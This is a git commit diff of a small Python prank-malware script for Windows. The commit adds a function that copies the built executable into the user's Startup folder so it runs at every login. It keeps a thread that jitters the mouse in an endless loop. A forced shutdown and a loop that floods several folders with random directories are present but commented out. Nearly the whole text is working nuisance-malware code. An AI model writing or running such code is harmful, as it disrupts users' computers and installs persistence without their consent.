14ba017fd5552c06670e2fadb724fe3b6f370c0f
unknown <babak.khezri7@gamil.com>
2020-04-17 13:26:57 +0430

    Copy program to startup and all time run

--- mkdir.py
+++ mkdir.py
@@ -1,16 +1,26 @@
 from os import getcwd, mkdir, system
 from getpass import getuser
-from random import sample , randint
+from random import sample, randint
 from pynput.mouse import Controller
 from threading import Thread
+from shutil import copy
+
+
+def copy_startup():
+    startup = 'C:\\Users\\' + getuser() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+    copy('mkdir.exe', startup)
+
+
 def move_mouse():
     mouse = Controller()
     while True:
-        x = randint(-2, 2)
-        y = randint(-2, 2)
+        x = randint(randint(-5, 0), randint(0, 5))
+        y = randint(randint(-5, 0), randint(0, 5))
         mouse.move(x, y)
-mouse_killer = Thread(target = move_mouse)
-mouse_killer.start()
+
+
+Thread(target=move_mouse).start()
+Thread(target=copy_startup).start()
 username = getuser()
 addres_1 = getcwd()
 addres_2 = "D:\\"
@@ -22,12 +32,13 @@ addres_7 = "C:\\Users\\" + username + "\\Pictures"
 addres_8 = "C:\\Intel"
 name = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789(_!@#$%^&=+-`~)'
 # turn off the system ofter 10 sec
-system("shutdown/s")
+# system("shutdown/s")
 while True:
     # make random name for directory
     print(addres_3)
     directory = "".join(sample(name, 10))
     # create the directories
+    '''
     mkdir(addres_1 + "\\{}".format(directory))
     mkdir(addres_2 + "\\{}".format(directory))
     mkdir(addres_3 + "\\{}".format(directory))
@@ -36,3 +47,4 @@ while True:
     mkdir(addres_6 + "\\{}".format(directory))
     mkdir(addres_7 + "\\{}".format(directory))
     mkdir(addres_8 + "\\{}".format(directory))
+    '''
